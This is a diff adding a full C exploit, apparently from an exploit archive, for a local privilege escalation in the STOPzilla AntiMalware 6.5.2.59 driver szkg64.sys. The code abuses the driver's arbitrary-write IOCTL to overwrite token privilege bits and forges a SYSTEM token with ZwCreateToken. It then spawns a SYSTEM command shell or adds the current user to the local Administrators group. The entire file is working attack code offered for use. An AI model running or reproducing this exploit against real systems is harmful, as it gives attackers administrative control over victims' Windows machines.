@@ -1,0 +1,506 @@
+/*
+# Exploit Title: STOPzilla AntiMalware 6.5.2.59 - Privilege Escalation
+# Date: 2018-09-13
+# Author: Parvez Anwar (@parvezghh)
+# Vendor Homepage: https://www.stopzilla.com/
+# Software link: https://download.stopzilla.com/binaries/stopzilla/auto_installer/STOPzillaAntiMalware.msi
+# Tested Version: 6.5.2.59
+# Driver Version: 3.0.23.0 - szkg64.sys
+# Tested on OS: 64bit Windows 7 and Windows 10 (1803) 
+# CVE ID: N/A
+# Vendor fix url   - No response from vendor 
+# Fixed Version    - 0day
+# Fixed driver ver - 0day
+# https://www.greyhathacker.net/?p=1025
+
+*/
+
+#include <stdio.h>
+#include <windows.h>
+#include <winternl.h>
+#include <sddl.h>
+
+#pragma comment(lib,"winsta.lib")
+#pragma comment(lib,"advapi32.lib")
+
+#define SystemHandleInformation 16
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xc0000004L)
+#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
+
+void WINAPI WinStationSwitchToServicesSession();
+
+
+typedef unsigned __int64 QWORD;
+
+
+typedef struct _SID_BUILTIN
+{
+     UCHAR Revision;
+     UCHAR SubAuthorityCount;
+     SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
+     ULONG SubAuthority[2];
+} SID_BUILTIN, *PSID_BUILTIN;
+
+
+typedef struct _SID_INTEGRITY
+{
+     UCHAR Revision;
+     UCHAR SubAuthorityCount;
+     SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
+     ULONG SubAuthority[1];
+} SID_INTEGRITY, *PSID_INTEGRITY;
+
+
+typedef NTSYSAPI NTSTATUS (NTAPI *_ZwCreateToken)(
+     OUT PHANDLE TokenHandle,
+     IN ACCESS_MASK DesiredAccess,
+     IN POBJECT_ATTRIBUTES ObjectAttributes,
+     IN TOKEN_TYPE Type,
+     IN PLUID AuthenticationId,
+     IN PLARGE_INTEGER ExpirationTime,
+     IN PTOKEN_USER User,
+     IN PTOKEN_GROUPS Groups,
+     IN PTOKEN_PRIVILEGES Privileges,
+     IN PTOKEN_OWNER Owner,
+     IN PTOKEN_PRIMARY_GROUP PrimaryGroup,
+     IN PTOKEN_DEFAULT_DACL DefaultDacl,
+     IN PTOKEN_SOURCE Source
+);
+
+
+typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
+{
+     ULONG       ProcessId;
+     UCHAR       ObjectTypeNumber;
+     UCHAR       Flags;
+     USHORT      Handle;
+     QWORD       Object;
+     ACCESS_MASK GrantedAccess;
+} SYSTEM_HANDLE, *PSYSTEM_HANDLE;
+
+
+typedef struct _SYSTEM_HANDLE_INFORMATION 
+{
+     ULONG NumberOfHandles;
+     SYSTEM_HANDLE Handles[1];
+} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
+
+
+typedef NTSTATUS (WINAPI *_NtQuerySystemInformation)(
+     ULONG SystemInformationClass,
+     PVOID SystemInformation,
+     ULONG SystemInformationLength,
+     PULONG ReturnLength);
+
+
+
+int GetWindowsVersion()
+{
+    int            ver = 0;
+    OSVERSIONINFO  osvi;
+
+
+    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
+    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+
+    GetVersionEx(&osvi);
+
+    if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1) ver = 1; // Windows 7
+    if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 2) ver = 2; // Windows 10
+
+    return ver;
+}
+
+
+
+int spawnShell(HANDLE hTokenElevated)
+{
+    STARTUPINFO          si;     
+    PROCESS_INFORMATION  pi;
+
+  
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+    si.cb = sizeof(STARTUPINFO);
+    si.lpDesktop = "WinSta0\\Default";
+       
+    if (!CreateProcessAsUser(hTokenElevated, NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
+    {
+        printf("\n[-] Failed to execute command (%d) Run exploit again\n\n", GetLastError());
+        return -1;
+    }
+    printf("\n[+] Executed command successfully");	
+
+    printf("\n[*] Switching session . . .\n\n");	
+    WinStationSwitchToServicesSession();    	
+   
+    return 0;
+}
+
+
+
+int AddAccountToAdminGroup(HANDLE hTokenElevated)
+{
+    STARTUPINFO          si;     
+    PROCESS_INFORMATION  pi;
+    DWORD                currentusersize;
+    char                 currentuser[100];
+    char                 netcommand[MAX_PATH];            
+
+ 
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+    si.cb = sizeof(STARTUPINFO);
+
+    currentusersize = sizeof(currentuser);
+
+    if (!GetUserName(currentuser, &currentusersize))
+    {
+        printf("\n[-] Failed to obtain current username: %d\n\n", GetLastError());
+        return -1;
+    }
+
+    printf("\n[*] Adding current user '%s' account to the local administrators group", currentuser);
+
+    sprintf(netcommand, "net localgroup Administrators %s /add", currentuser);        
+       
+    if (!CreateProcessAsUser(hTokenElevated, NULL, netcommand, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
+    {
+        printf("\n[-] Failed to execute command (%d) Run exploit again\n\n", GetLastError());
+        return -1;
+    }
+    printf("\n[+] Executed command successfully\n");		
+   
+    return 0;
+}
+
+
+
+PTOKEN_PRIVILEGES SetPrivileges()
+{
+    PTOKEN_PRIVILEGES   privileges;
+    LUID                luid;
+    int                 NumOfPrivileges = 5;   
+    int                 nBufferSize;  
+
+                 
+    nBufferSize = sizeof(TOKEN_PRIVILEGES) + sizeof(LUID_AND_ATTRIBUTES) * NumOfPrivileges;   
+    privileges = (PTOKEN_PRIVILEGES) LocalAlloc(LPTR, nBufferSize);  
+
+    privileges->PrivilegeCount = NumOfPrivileges;
+
+    LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid);
+    privileges->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    privileges->Privileges[0].Luid = luid;
+    
+    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
+    privileges->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
+    privileges->Privileges[1].Luid = luid;    
+
+    LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid);
+    privileges->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
+    privileges->Privileges[2].Luid = luid;	
+
+    LookupPrivilegeValue(NULL, SE_TAKE_OWNERSHIP_NAME, &luid);
+    privileges->Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;
+    privileges->Privileges[3].Luid = luid;	
+
+    LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid);
+    privileges->Privileges[4].Attributes = SE_PRIVILEGE_ENABLED;
+    privileges->Privileges[4].Luid = luid;
+    
+    return privileges;	   	
+}
+
+
+
+PSID GetLocalSystemSID()
+{
+    PSID                       psid = NULL;
+    SID_IDENTIFIER_AUTHORITY   sidAuth = SECURITY_NT_AUTHORITY;
+	
+
+    if (AllocateAndInitializeSid(&sidAuth, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &psid) == FALSE)
+    {  
+        printf("\n[-] AllocateAndInitializeSid failed %d\n", GetLastError());  
+        return NULL;
+    }  
+
+    return psid;
+}
+
+
+
+LPVOID GetInfoFromToken(HANDLE hToken, TOKEN_INFORMATION_CLASS type)
+{
+    DWORD    dwLengthNeeded;
+    LPVOID   lpData = NULL;
+
+
+    if (!GetTokenInformation(hToken, type, NULL, 0, &dwLengthNeeded) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
+    {
+        printf("\n[-] Failed to initialize GetTokenInformation %d", GetLastError());
+        return NULL;
+    }
+
+    lpData = (LPVOID)LocalAlloc(LPTR, dwLengthNeeded);
+    GetTokenInformation(hToken, type, lpData, dwLengthNeeded, &dwLengthNeeded);      
+
+    return lpData;
+}
+
+
+
+QWORD TokenAddressCurrentProcess(HANDLE hProcess, DWORD MyProcessID) 
+{
+    _NtQuerySystemInformation   NtQuerySystemInformation;
+    PSYSTEM_HANDLE_INFORMATION  pSysHandleInfo; 
+    ULONG                       i;
+    PSYSTEM_HANDLE              pHandle;
+    QWORD                       TokenAddress = 0;       
+    DWORD                       nSize = 4096;
+    DWORD                       nReturn; 
+    BOOL                        tProcess;    
+    HANDLE                      hToken;
+
+
+    if ((tProcess = OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) == FALSE)
+    {
+        printf("\n[-] OpenProcessToken() failed (%d)\n", GetLastError());
+        return -1;
+    }
+
+    NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
+ 	
+    if (!NtQuerySystemInformation)
+    {
+        printf("[-] Unable to resolve NtQuerySystemInformation\n\n");
+        return -1;  
+    }
+
+    do
+    {  
+        nSize += 4096;
+        pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION) HeapAlloc(GetProcessHeap(), 0, nSize); 
+    } while (NtQuerySystemInformation(SystemHandleInformation, pSysHandleInfo, nSize, &nReturn) == STATUS_INFO_LENGTH_MISMATCH);
+	
+    printf("\n[i] Current process id %d and token handle value %u", MyProcessID, hToken);	
+
+    for (i = 0; i < pSysHandleInfo->NumberOfHandles; i++) 
+    {
+
+        if (pSysHandleInfo->Handles[i].ProcessId == MyProcessID && pSysHandleInfo->Handles[i].Handle == hToken) 
+        {
+            TokenAddress = pSysHandleInfo->Handles[i].Object;	     			  
+        }
+    }
+
+    HeapFree(GetProcessHeap(), 0, pSysHandleInfo);
+    return TokenAddress;	
+}
+
+
+
+HANDLE CreateUserToken(HANDLE hToken)
+{
+     _ZwCreateToken               ZwCreateToken;  
+     HANDLE                       hTokenElevated;
+     NTSTATUS                     status;
+     int                          i;
+     DWORD                        dwSize = 0;   
+     TOKEN_USER                   userToken;    
+     PTOKEN_PRIVILEGES            privileges = NULL;
+     PTOKEN_OWNER                 ownerToken = NULL;	
+     PTOKEN_GROUPS                groups = NULL;	
+     PTOKEN_PRIMARY_GROUP         primary_group = NULL; 
+     PTOKEN_DEFAULT_DACL          default_dacl = NULL;      	
+     PLUID                        pluidAuth;
+     LARGE_INTEGER                li;
+     PLARGE_INTEGER               pli;   
+     LUID                         authid = SYSTEM_LUID;
+     LUID                         luid;
+     PSID_AND_ATTRIBUTES          pSid;   
+     SID_BUILTIN                  TkSidLocalAdminGroup = { 1, 2, { 0, 0, 0, 0, 0, 5 }, { 32, DOMAIN_ALIAS_RID_ADMINS } };
+     SECURITY_QUALITY_OF_SERVICE  sqos = { sizeof(sqos), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE };	
+     OBJECT_ATTRIBUTES            oa = { sizeof(oa), 0, 0, 0, 0, &sqos }; 
+     TOKEN_SOURCE                 SourceToken  = { { '!', '!', '!', '!', '!', '!', '!', '!' }, { 0, 0 } };	     	     
+     SID_IDENTIFIER_AUTHORITY     nt = SECURITY_NT_AUTHORITY;
+     PSID                         lpSidOwner = NULL;     
+     SID_INTEGRITY                IntegritySIDSystem = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_SYSTEM_RID };
+
+
+     ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll.dll"), "ZwCreateToken");
+
+     if (ZwCreateToken == NULL)
+     {
+         printf("[-] Unable to resolve ZwCreateToken: %d\n\n", GetLastError());
+         return NULL;
+     }
+    
+     groups = (PTOKEN_GROUPS)GetInfoFromToken(hToken, TokenGroups);   
+     primary_group = (PTOKEN_PRIMARY_GROUP)GetInfoFromToken(hToken, TokenPrimaryGroup);  
+     default_dacl = (PTOKEN_DEFAULT_DACL)GetInfoFromToken(hToken, TokenDefaultDacl);     
+
+     pSid = groups->Groups;
+       
+     for (i=0; i<groups->GroupCount; i++, pSid++) 
+     {        
+        PISID piSid = (PISID)pSid->Sid; 
+           
+        if (pSid->Attributes & SE_GROUP_INTEGRITY)
+        {
+           memcpy(pSid->Sid, &IntegritySIDSystem, sizeof(IntegritySIDSystem));
+        }        
+         
+        if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS)
+        {       
+            memcpy(piSid, &TkSidLocalAdminGroup, sizeof(TkSidLocalAdminGroup));  // Found RID_USERS membership, overwrite with RID_ADMINS  
+            pSid->Attributes = SE_GROUP_ENABLED; 
+        } 
+        else 
+        {
+            pSid->Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
+            pSid->Attributes &= ~SE_GROUP_ENABLED;
+        } 
+     }
+ 
+     pluidAuth = &authid;
+     li.LowPart = 0xFFFFFFFF;
+     li.HighPart = 0xFFFFFFFF;
+     pli = &li;
+              
+     AllocateAndInitializeSid(&nt, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &lpSidOwner);
+     userToken.User.Sid = lpSidOwner;
+     userToken.User.Attributes = 0;
+                
+     AllocateLocallyUniqueId(&luid);
+     SourceToken.SourceIdentifier.LowPart = luid.LowPart;
+     SourceToken.SourceIdentifier.HighPart = luid.HighPart;
+	
+     ownerToken = (PTOKEN_OWNER) LocalAlloc(LPTR, sizeof(PSID));       
+     ownerToken->Owner = GetLocalSystemSID();
+
+     privileges = SetPrivileges();
+    	
+     status = ZwCreateToken(&hTokenElevated,
+                            TOKEN_ALL_ACCESS,
+                            &oa, 
+                            TokenPrimary,
+                            pluidAuth,
+                            pli,
+                            &userToken,               
+                            groups, 
+                            privileges,
+                            ownerToken,
+                            primary_group,
+                            default_dacl,
+                            &SourceToken);
+
+     if (status == STATUS_SUCCESS)
+     {
+         printf("\n[+] New token created successfully\n");         
+         return hTokenElevated;
+     }
+     else
+     {
+//       printf("\n[-] Failed to create new token %08x\n", status);   
+         return NULL;
+     }
+
+     if (lpSidOwner) FreeSid(lpSidOwner);     
+     if (groups) LocalFree(groups);
+     if (privileges) LocalFree(privileges); 
+     if (primary_group) LocalFree(primary_group);   
+     if (default_dacl) LocalFree(default_dacl);      
+     if (ownerToken) { if(ownerToken->Owner) FreeSid(ownerToken->Owner); LocalFree(ownerToken); }
+			
+     return NULL;
+}
+
+
+
+int main(int argc, char *argv[]) 
+{
+
+    QWORD      TokenAddressTarget; 
+    QWORD      SepPrivilegesOffset = 0x40;
+    QWORD      PresentByteOffset;
+    QWORD      EnableByteOffset;
+    QWORD      TokenAddress;
+    HANDLE     hDevice;
+    char       devhandle[MAX_PATH];
+    DWORD      dwRetBytes = 0;             
+    HANDLE     hTokenCurrent;
+    HANDLE     hTokenElevate;  
+
+
+    printf("-------------------------------------------------------------------------------\n");
+    printf("         STOPzilla AntiMalware (szkg64.sys) Arbitrary Write EoP Exploit        \n");
+    printf("                 Tested on 64bit Windows 7 / Windows 10 (1803)                 \n");
+    printf("-------------------------------------------------------------------------------\n");
+
+    TokenAddress = TokenAddressCurrentProcess(GetCurrentProcess(), GetCurrentProcessId());
+    printf("\n[i] Address of current process token 0x%p", TokenAddress);
+
+    TokenAddressTarget = TokenAddress + SepPrivilegesOffset;
+    printf("\n[i] Address of _SEP_TOKEN_PRIVILEGES 0x%p will be overwritten\n", TokenAddressTarget);
+
+    PresentByteOffset = TokenAddressTarget + 0x0;
+    printf("[i] Present bits at 0x%p will be overwritten\n", PresentByteOffset);
+
+    EnableByteOffset = TokenAddressTarget + 0x8;
+    printf("[i] Enabled bits at 0x%p will be overwritten", EnableByteOffset);
+
+    sprintf(devhandle, "\\\\.\\%s", "msprocess");
+
+    hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
+    
+    if(hDevice == INVALID_HANDLE_VALUE)
+    {
+        printf("\n[-] Open %s device failed\n\n", devhandle);
+        return -1;
+    }
+    else 
+    {
+        printf("\n[+] Open %s device successful", devhandle);
+    }	
+
+    printf("\n[~] Press any key to continue . . .\n");
+    getch();
+       
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hTokenCurrent))	
+    {
+        printf("[-] Failed OpenProcessToken() %d\n\n", GetLastError());
+        return NULL;
+    }
+    printf("[+] OpenProcessToken() handle opened successfully");  
+   
+    do 
+    {
+        printf("\n[*] Overwriting _SEP_TOKEN_PRIVILEGES bits");     
+        DeviceIoControl(hDevice, 0x80002063, NULL, 0, (LPVOID)PresentByteOffset, 0, &dwRetBytes, NULL);
+        DeviceIoControl(hDevice, 0x80002063, NULL, 0, (LPVOID)EnableByteOffset, 0, &dwRetBytes, NULL);  
+        hTokenElevate = CreateUserToken(hTokenCurrent); 
+        Sleep(500); 
+    } while (hTokenElevate == NULL);
+           
+    if (GetWindowsVersion() == 1) 
+    {
+        printf("[i] Running Windows 7");
+        printf("\n[*] Spawning SYSTEM Shell");
+        spawnShell(hTokenElevate);
+    }
+    if (GetWindowsVersion() == 2) 
+    {
+        printf("[i] Running Windows 10");
+        AddAccountToAdminGroup(hTokenElevate);   
+    }
+    else if (GetWindowsVersion() == 0) 
+    {
+        printf("[i] Exploit not tested on this OS\n\n");
+    }  
+
+    CloseHandle(hDevice);
+
+    return 0;
+}
